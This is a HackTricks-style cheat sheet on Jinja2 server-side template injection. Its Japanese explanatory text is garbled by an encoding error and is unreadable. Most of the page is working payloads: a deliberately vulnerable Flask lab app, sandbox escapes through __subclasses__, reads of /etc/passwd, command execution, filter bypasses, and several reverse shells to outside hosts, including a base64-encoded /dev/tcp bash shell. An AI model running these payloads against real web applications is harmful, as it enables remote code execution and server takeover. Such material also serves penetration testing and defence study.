# Jinja2 SSTI

<details>

<summary><strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«**å‚åŠ ã™ã‚‹**ã‹ã€[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã€ã¾ãŸã¯**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’**å…±æœ‰ã™ã‚‹**ã€‚

</details>

## **ãƒ©ãƒœ**
```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/")
def home():
if request.args.get('c'):
return render_template_string(request.args.get('c'))
else:
return "Hello, send someting inside the param 'c'!"

if __name__ == "__main__":
app.run()
```
## **ãã®ä»–**

### **ãƒ‡ãƒãƒƒã‚°ã‚¹ãƒ†ãƒ¼ãƒˆãƒ¡ãƒ³ãƒˆ**

ãƒ‡ãƒãƒƒã‚°æ‹¡å¼µæ©Ÿèƒ½ãŒæœ‰åŠ¹ã«ãªã£ã¦ã„ã‚‹å ´åˆã€ç¾åœ¨ã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã‚„åˆ©ç”¨å¯èƒ½ãªãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã¨ãƒ†ã‚¹ãƒˆã‚’ãƒ€ãƒ³ãƒ—ã™ã‚‹ãŸã‚ã® `debug` ã‚¿ã‚°ãŒåˆ©ç”¨å¯èƒ½ã«ãªã‚Šã¾ã™ã€‚ã“ã‚Œã¯ã€ãƒ‡ãƒãƒƒã‚¬ãƒ¼ã‚’è¨­å®šã›ãšã«ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã§ä½¿ç”¨ã§ãã‚‹ã‚‚ã®ãŒä½•ã‹ã‚’ç¢ºèªã™ã‚‹ã®ã«å½¹ç«‹ã¡ã¾ã™ã€‚
```python
<pre>

{% raw %}
{% debug %}
{% endraw %}





</pre>
```
### **ã™ã¹ã¦ã®è¨­å®šå¤‰æ•°ã‚’ãƒ€ãƒ³ãƒ—ã™ã‚‹**
```python
{{ config }} #In these object you can find all the configured env variables


{% raw %}
{% for key, value in config.items() %}
<dt>{{ key|e }}</dt>
<dd>{{ value|e }}</dd>
{% endfor %}
{% endraw %}




```
## **Jinjaã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³**

ã¾ãšã€Jinjaã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã§ã¯ã€**ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹ã‹ã‚‰è„±å‡ºã—**ã€é€šå¸¸ã®Pythonå®Ÿè¡Œãƒ•ãƒ­ãƒ¼ã«ã‚¢ã‚¯ã‚»ã‚¹ã‚’å›å¾©ã™ã‚‹æ–¹æ³•ã‚’è¦‹ã¤ã‘ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã‚’è¡Œã†ã«ã¯ã€**ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹ç’°å¢ƒå†…ã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ã ãŒã€éã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹ç’°å¢ƒã‹ã‚‰ã®**ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’**æ‚ªç”¨ã™ã‚‹**å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

### ã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¸ã®ã‚¢ã‚¯ã‚»ã‚¹

ä¾‹ãˆã°ã€ã‚³ãƒ¼ãƒ‰ `render_template("hello.html", username=username, email=email)` ã§ã¯ã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆusernameã¨emailã¯**éã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹åŒ–ã•ã‚ŒãŸPythonç’°å¢ƒã‹ã‚‰æ¥ã¦ãŠã‚Š**ã€**ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹åŒ–ã•ã‚ŒãŸç’°å¢ƒå†…ã§ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½**ã§ã™ã€‚\
ã•ã‚‰ã«ã€ä»¥ä¸‹ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯**å¸¸ã«ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹åŒ–ã•ã‚ŒãŸç’°å¢ƒã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½**ã§ã™ï¼š
```
[]
''
()
dict
config
request
```
### \<class 'object'> ã®å›å¾©

ã“ã‚Œã‚‰ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‹ã‚‰ã€å®šç¾©ã•ã‚ŒãŸ**ã‚¯ãƒ©ã‚¹**ã‚’**å›å¾©**ã—ã‚ˆã†ã¨ã™ã‚‹ãŸã‚ã«ã€**`<class 'object'>`** ã¨ã„ã†ã‚¯ãƒ©ã‚¹ã«åˆ°é”ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã¯ã€ã“ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‹ã‚‰ **`__subclasses__`** ãƒ¡ã‚½ãƒƒãƒ‰ã‚’å‘¼ã³å‡ºã—ã€**ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹åŒ–ã•ã‚Œã¦ã„ãªã„** Python ç’°å¢ƒã®ã™ã¹ã¦ã®ã‚¯ãƒ©ã‚¹ã«**ã‚¢ã‚¯ã‚»ã‚¹**ã§ãã‚‹ãŸã‚ã§ã™ã€‚

ãã®**ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚¯ãƒ©ã‚¹**ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã«ã¯ã€**ã‚¯ãƒ©ã‚¹ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹**ã—ã€ãã®å¾Œ **`__base__`**ã€**`__mro__()`**`[-1]` ã¾ãŸã¯ `.`**`mro()[-1]`** ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ãã—ã¦ã€ã“ã®**ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚¯ãƒ©ã‚¹**ã«åˆ°é”ã—ãŸ**å¾Œ**ã€**`__subclasses__()`** ã‚’**å‘¼ã³å‡ºã—ã¾ã™**ã€‚

ã“ã‚Œã‚‰ã®ä¾‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š
```python
# To access a class object
[].__class__
''.__class__
()["__class__"] # You can also access attributes like this
request["__class__"]
config.__class__
dict #It's already a class

# From a class to access the class "object".
## "dict" used as example from the previous list:
dict.__base__
dict["__base__"]
dict.mro()[-1]
dict.__mro__[-1]
(dict|attr("__mro__"))[-1]
(dict|attr("\x5f\x5fmro\x5f\x5f"))[-1]

# From the "object" class call __subclasses__()
{{ dict.__base__.__subclasses__() }}
{{ dict.mro()[-1].__subclasses__() }}
{{ (dict.mro()[-1]|attr("\x5f\x5fsubclasses\x5f\x5f"))() }}

{% raw %}
{% with a = dict.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}

# Other examples using these ways
{{ ().__class__.__base__.__subclasses__() }}
{{ [].__class__.__mro__[-1].__subclasses__() }}
{{ ((""|attr("__class__")|attr("__mro__"))[-1]|attr("__subclasses__"))() }}
{{ request.__class__.mro()[-1].__subclasses__() }}
{% with a = config.__class__.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}
{% endraw %}






# Not sure if this will work, but I saw it somewhere
{{ [].class.base.subclasses() }}
{{ ''.class.mro()[1].subclasses() }}
```
### RCE ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—

`<class 'object'>` ã‚’**å›å¾©ã—ãŸå¾Œ**ã€`__subclasses__` ã‚’å‘¼ã³å‡ºã—ã¦ã€ãƒ•ã‚¡ã‚¤ãƒ«ã®èª­ã¿æ›¸ãã‚„ã‚³ãƒ¼ãƒ‰ã®å®Ÿè¡Œã«ä½¿ç”¨ã§ãã‚‹ã‚¯ãƒ©ã‚¹ã‚’åˆ©ç”¨ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã—ãŸã€‚

`__subclasses__` ã®å‘¼ã³å‡ºã—ã«ã‚ˆã‚Šã€**ä½•ç™¾ã‚‚ã®æ–°ã—ã„é–¢æ•°ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹æ©Ÿä¼š**ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸãŒã€**ãƒ•ã‚¡ã‚¤ãƒ«ã‚¯ãƒ©ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿æ›¸ãã™ã‚‹**ã“ã¨ã‚„ã€ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹æ©Ÿèƒ½ã‚’æŒã¤ã‚¯ãƒ©ã‚¹ï¼ˆ`os` ã®ã‚ˆã†ãªï¼‰ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã ã‘ã§æº€è¶³ã—ã¾ã™ã€‚

**ãƒªãƒ¢ãƒ¼ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã®èª­ã¿æ›¸ã**
```python
# ''.__class__.__mro__[1].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```
**RCEï¼ˆãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰å®Ÿè¡Œï¼‰**
```python
# The class 396 is the class <class 'subprocess.Popen'>
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}

# Calling os.popen without guessing the index of the class

{% raw %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}

## Passing the cmd line in a GET param
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
{% endraw %}


```
**ã‚ˆã‚Šå¤šãã®ã‚¯ãƒ©ã‚¹**ã«ã¤ã„ã¦å­¦ã¶ãŸã‚ã«ã€**ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—**ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã‚‹ã‚‚ã®ã‚’**ç¢ºèª**ã™ã‚‹ã«ã¯ï¼š

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã®ãƒã‚¤ãƒ‘ã‚¹

#### ä¸€èˆ¬çš„ãªãƒã‚¤ãƒ‘ã‚¹

ã“ã‚Œã‚‰ã®ãƒã‚¤ãƒ‘ã‚¹ã«ã‚ˆã‚Šã€ä¸€éƒ¨ã®æ–‡å­—ã‚’**ä½¿ç”¨ã›ãšã«**ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®**å±æ€§**ã«**ã‚¢ã‚¯ã‚»ã‚¹**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
ã“ã‚Œã‚‰ã®ãƒã‚¤ãƒ‘ã‚¹ã®ã„ãã¤ã‹ã¯å‰ã®ä¾‹ã§æ—¢ã«è¦‹ã¦ã„ã¾ã™ãŒã€ã“ã“ã§ãã‚Œã‚‰ã‚’ã¾ã¨ã‚ã¦ã¿ã¾ã—ã‚‡ã†ï¼š
```bash
# Without quotes, _, [, ]
## Basic ones
request.__class__
request["__class__"]
request['\x5f\x5fclass\x5f\x5f']
request|attr("__class__")
request|attr(["_"*2, "class", "_"*2]|join) # Join trick

## Using request object options
request|attr(request.headers.c) #Send a header like "c: __class__" (any trick using get params can be used with headers also)
request|attr(request.args.c) #Send a param like "?c=__class__
request|attr(request.query_string[2:16].decode() #Send a param like "?c=__class__
request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join) # Join list to string
http://localhost:5000/?c={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_ #Formatting the string from get params

## Lists without "[" and "]"
http://localhost:5000/?c={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_

# Using with

{% raw %}
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() %} a {% endwith %}
{% endraw %}




```
* [**ã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã®ã•ã‚‰ãªã‚‹ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã«æˆ»ã‚‹**](jinja2-ssti.md#accessing-global-objects)
* [**ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚¯ãƒ©ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã®ã•ã‚‰ãªã‚‹ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã«æˆ»ã‚‹**](jinja2-ssti.md#recovering-less-than-class-object-greater-than)
* [**ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚¯ãƒ©ã‚¹ãªã—ã§RCEã‚’å–å¾—ã™ã‚‹ã«ã¯ã€ã“ã‚Œã‚’èª­ã‚€**](jinja2-ssti.md#jinja-injection-without-less-than-class-object-greater-than)

**HTMLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã‚’é¿ã‘ã‚‹**

ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€Flaskã¯ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¸Šã®ç†ç”±ã‹ã‚‰ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆå†…ã®ã™ã¹ã¦ã‚’HTMLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã—ã¾ã™ï¼š
```python
{{'<script>alert(1);</script>'}}
#will be
&lt;script&gt;alert(1);&lt;/script&gt;
```
**`safe`** ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€æ¬¡ã®ã‚ˆã†ã«ã€JavaScriptã‚„HTMLã‚’ãƒšãƒ¼ã‚¸ã«**HTMLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚Œãšã«**æ³¨å…¥ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```python
{{'<script>alert(1);</script>'|safe}}
#will be
<script>alert(1);</script>
```
**æ‚ªæ„ã®ã‚ã‚‹è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã‚’æ›¸ãè¾¼ã‚€ã“ã¨ã«ã‚ˆã‚‹RCEã€‚**
```python
# evil config
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

# load the evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}

# connect to evil host
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
```
## è¤‡æ•°ã®æ–‡å­—ãªã—

**`{{`** **`.`** **`[`** **`]`** **`}}`** **`_`** ãªã—
```python
{% raw %}
{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls${IFS}-l')|attr('read')()%}{%print(a)%}{%endwith%}
{% endraw %}



```
## Jinjaã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ **\<class 'object'>** ãªã—ã§

[**ã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ**](jinja2-ssti.md#accessing-global-objects)ã‹ã‚‰ã€ãã®ã‚¯ãƒ©ã‚¹ã‚’ä½¿ç”¨ã›ãšã« **RCEã«åˆ°é”ã™ã‚‹åˆ¥ã®æ–¹æ³•ãŒã‚ã‚Šã¾ã™ã€‚**\
ã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ä»»æ„ã®**é–¢æ•°**ã«åˆ°é”ã§ãã‚Œã°ã€**`__globals__.__builtins__`** ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã€ãã“ã‹ã‚‰ **RCE** ã¯éå¸¸ã«**ã‚·ãƒ³ãƒ—ãƒ«**ã§ã™ã€‚

ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ **`request`**ã€**`config`** ãŠã‚ˆã³ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ãªãã®ä»–ã®èˆˆå‘³æ·±ã„**ã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ**ã‹ã‚‰**é–¢æ•°ã‚’è¦‹ã¤ã‘ã‚‹**ã“ã¨ãŒã§ãã¾ã™:
```bash
{{ request.__class__.__dict__ }}
- application
- _load_form_data
- on_json_loading_failed

{{ config.__class__.__dict__ }}
- __init__
- from_envvar
- from_pyfile
- from_object
- from_file
- from_json
- from_mapping
- get_namespace
- __repr__

# You can iterate through children objects to find more
```
```markdown
ä¸€åº¦é–¢æ•°ã‚’è¦‹ã¤ã‘ãŸã‚‰ã€ä»¥ä¸‹ã®æ–¹æ³•ã§builtinsã‚’å¾©å…ƒã§ãã¾ã™:
```
```python
# Read file
{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}

# RCE
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}
{{ config.__class__.from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}
{{ (config|attr("__class__")).from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}

{% raw %}
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("ls")["read"]() %} {{ a }} {% endwith %}
{% endraw %}

## Extra
## The global from config have a access to a function called import_string
## with this function you don't need to access the builtins
{{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}

# All the bypasses seen in the previous sections are also valid
```
## å‚è€ƒæ–‡çŒ®

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
* [attr ãƒˆãƒªãƒƒã‚¯ã‚’ä½¿ã£ã¦ãƒ–ãƒ©ãƒƒã‚¯ãƒªã‚¹ãƒˆã«è¼‰ã£ã¦ã„ã‚‹æ–‡å­—ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹æ–¹æ³•ã¯ã“ã¡ã‚‰](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/#python3)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ã€‚
* [https://twitter.com/SecGus/status/1198976764351066113](https://twitter.com/SecGus/status/1198976764351066113)
* [https://hackmd.io/@Chivato/HyWsJ31dI](https://hackmd.io/@Chivato/HyWsJ31dI)

<details>

<summary><strong>AWS ãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶ã«ã¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ã‚’ã”è¦§ãã ã•ã„ï¼</strong></summary>

HackTricks ã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricks ã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯ **HackTricks ã‚’ PDF ã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„** å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼ã® PEASS & HackTricks ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã—ã¦ãã ã•ã„ã€‚
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¦ãã ã•ã„ã€‚ç§ãŸã¡ã®ç‹¬å çš„ãª [**NFTs**](https://opensea.io/collection/the-peass-family) ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* ğŸ’¬ [**Discord ã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«**å‚åŠ ã™ã‚‹ã‹**ã€[**telegram ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm) ã‚’ **ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«** [**HackTricks**](https://github.com/carlospolop/hacktricks) ã¨ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ã® github ãƒªãƒã‚¸ãƒˆãƒªã« PR ã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
